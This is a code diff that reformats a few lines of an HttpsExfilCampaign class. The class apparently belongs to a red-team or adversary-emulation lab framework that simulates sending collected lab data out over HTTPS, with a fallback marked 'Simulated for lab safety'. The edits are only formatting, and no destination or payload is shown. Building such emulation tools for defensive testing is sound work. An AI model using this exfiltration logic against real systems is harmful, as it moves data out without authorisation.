@@ -35,7 +35,9 @@ class HttpsExfilCampaign(BaseCampaign):
         self.log_step("data_collection", f"Collected {len(payload)} bytes of lab data")
 
         exfil_result = self._exfiltrate(payload)
-        self.log_step("https_exfil", f"Exfiltration: {exfil_result['status']}", exfil_result["status"])
+        self.log_step(
+            "https_exfil", f"Exfiltration: {exfil_result['status']}", exfil_result["status"]
+        )
 
         results = {
             "technique": self.TECHNIQUE_ID,
@@ -75,4 +77,8 @@ class HttpsExfilCampaign(BaseCampaign):
             )
             return {"status": "sent", "bytes": len(payload), "http_status": resp.status_code}
         except Exception:
-            return {"status": "simulated", "bytes": len(payload), "note": "Simulated for lab safety"}
+            return {
+                "status": "simulated",
+                "bytes": len(payload),
+                "note": "Simulated for lab safety",
+            }
